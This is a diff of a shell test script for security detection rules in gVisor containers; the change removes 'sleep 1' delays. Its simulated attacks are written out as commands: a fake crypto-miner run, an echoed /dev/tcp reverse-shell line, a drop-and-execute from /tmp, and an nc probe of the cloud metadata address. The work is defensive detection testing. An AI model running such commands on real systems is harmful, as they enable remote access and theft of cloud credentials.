@@ -119,16 +119,16 @@ grun() {
 scenario_detections() {
   log "detections"
   grun miner alpine:3.20 sh -c \
-    'sleep 1; cp /bin/busybox /tmp/xmrig && /tmp/xmrig --donate-level 1 -o stratum+tcp://example.invalid:3333' || true
+    'cp /bin/busybox /tmp/xmrig && /tmp/xmrig --donate-level 1 -o stratum+tcp://example.invalid:3333' || true
   expect_alert "miner binary with container metadata" "gVisor Crypto Miner Executed" "${PREFIX}-miner"
 
-  grun revshell alpine:3.20 sh -c 'sleep 1; sh -c "echo bash -i >& /dev/tcp/127.0.0.1/9 0>&1"' || true
+  grun revshell alpine:3.20 sh -c 'sh -c "echo bash -i >& /dev/tcp/127.0.0.1/9 0>&1"' || true
   expect_alert "reverse shell command line" "gVisor Reverse Shell Command Line" "${PREFIX}-revshell"
 
-  grun dropexec alpine:3.20 sh -c 'sleep 1; cp /bin/busybox /tmp/update && /tmp/update true' || true
+  grun dropexec alpine:3.20 sh -c 'cp /bin/busybox /tmp/update && /tmp/update true' || true
   expect_alert "drop and execute" "gVisor Dropped Binary Executed From Temp Directory" "${PREFIX}-dropexec"
 
-  grun imds alpine:3.20 sh -c 'sleep 1; nc -w 1 169.254.169.254 80 </dev/null' || true
+  grun imds alpine:3.20 sh -c 'nc -w 1 169.254.169.254 80 </dev/null' || true
   expect_alert "cloud metadata connect" "gVisor Connection to Cloud Metadata Service" "${PREFIX}-imds"
 
   log "benign workloads"
